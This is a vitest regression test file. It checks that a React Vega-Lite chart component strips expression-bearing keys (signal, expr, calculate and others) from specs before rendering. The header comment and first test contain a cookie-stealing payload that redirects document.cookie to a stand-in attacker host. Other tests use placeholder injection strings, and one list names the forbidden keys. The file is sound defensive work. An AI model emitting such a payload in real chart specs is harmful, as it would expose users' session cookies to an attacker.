/**
 * Regression tests for the Vega-Lite expression-stripping defence.
 *
 * Ported from Borjie PR #96 (commit 5a48444b — fix(genui): C2 strip
 * Vega-Lite expression injection vectors before render).
 *
 * Vega-Lite evaluates expression strings client-side inside many fields
 * (signal, expr, calculate, update, init, params). The ajv structural
 * schema only checks the outer shape; it does not forbid these expression
 * keys. An LLM-emitted spec like
 *   `{"params":[{"name":"x","expr":"window.location='https://atk/?c='+document.cookie"}]}`
 * would otherwise run arbitrary JS in the admin browser session at
 * vega-embed time — a confirmed RCE-in-browser at the cookie-access
 * boundary.
 *
 * We assert that the JSON fallback (which renders the sanitised spec via
 * `JSON.stringify(sanitisedSpec, null, 2)` inside a `<pre>`) contains no
 * trace of the forbidden keys nor the literal exploit payload.
 */

import { describe, it, expect } from "vitest";
import { render } from "@testing-library/react";
import ChartVegaLite from "../ChartVegaLite";

function renderFallback(rawSpec: Record<string, unknown>): string {
  // Scope DOM queries to this render's `container` so prior renders in
  // the same `describe` block (cleaned up by RTL between tests, but
  // possible to overlap during async re-renders) cannot produce
  // multi-match failures from `screen.getByLabelText`.
  const { container } = render(
    <ChartVegaLite
      spec={{
        kind: "chart.vega-lite",
        spec: rawSpec,
      }}
    />,
  );
  // The fallback `<pre>` wraps the sanitised spec as JSON. We read it
  // straight out of the DOM so we test exactly what the renderer hands
  // to vega-embed.
  const pre = container.querySelector("pre");
  expect(pre).not.toBeNull();
  return pre!.textContent ?? "";
}

describe("ChartVegaLite — Vega expression stripping (Borjie PR #96 C2)", () => {
  it("strips top-level params[].expr (literal exploit payload)", () => {
    const exploit = "window.location='https://atk/?c='+document.cookie";
    const text = renderFallback({
      mark: "bar",
      params: [{ name: "x", expr: exploit }],
    });
    expect(text).not.toContain("params");
    expect(text).not.toContain("expr");
    expect(text).not.toContain("window.location");
    expect(text).not.toContain("document.cookie");
  });

  it("strips signal at any depth", () => {
    const text = renderFallback({
      mark: { type: "bar", tooltip: { signal: "datum.__proto__" } },
    });
    expect(text).not.toContain("signal");
    expect(text).not.toContain("__proto__");
    expect(text).toContain("bar");
  });

  it("strips transform[].calculate", () => {
    const text = renderFallback({
      mark: "line",
      transform: [
        { calculate: "alert(1)", as: "evil" },
        { filter: "datum.y > 0" },
      ],
    });
    expect(text).not.toContain("calculate");
    expect(text).not.toContain("alert(1)");
    // Non-expression transform keys (filter) survive.
    expect(text).toContain("filter");
  });

  it("strips signal.on[].update and signal.init", () => {
    const text = renderFallback({
      mark: "bar",
      signals: [
        {
          name: "click",
          init: "evilInit()",
          on: [{ events: "click", update: "evilUpdate()" }],
        },
      ],
    });
    expect(text).not.toContain("init");
    expect(text).not.toContain("update");
    expect(text).not.toContain("evilInit");
    expect(text).not.toContain("evilUpdate");
  });

  it("strips deeply-nested expression keys inside layer specs", () => {
    const text = renderFallback({
      layer: [
        {
          mark: "bar",
          encoding: {
            x: {
              field: "year",
              type: "ordinal",
              axis: { labelExpr: "datum.value" }, // labelExpr stays — only 'expr' itself is stripped
            },
            tooltip: { signal: "evil" },
          },
        },
      ],
    });
    expect(text).not.toContain("signal");
    expect(text).not.toContain("evil");
    expect(text).toContain("ordinal");
  });

  it("leaves clean specs untouched", () => {
    const text = renderFallback({
      mark: "bar",
      data: { values: [{ a: 1, b: 2 }] },
      encoding: { x: { field: "a", type: "quantitative" } },
    });
    expect(text).toContain("bar");
    expect(text).toContain("quantitative");
  });

  it("strips every key in the VEGA_EXPRESSION_KEYS set", () => {
    const forbidden = [
      "signal",
      "expr",
      "calculate",
      "update",
      "init",
      "params",
    ];
    for (const key of forbidden) {
      const text = renderFallback({
        mark: "bar",
        [key]: "ATTACK_PAYLOAD_" + key,
      });
      expect(text).not.toContain("ATTACK_PAYLOAD_" + key);
      expect(text).not.toContain(`"${key}":`);
    }
  });
});
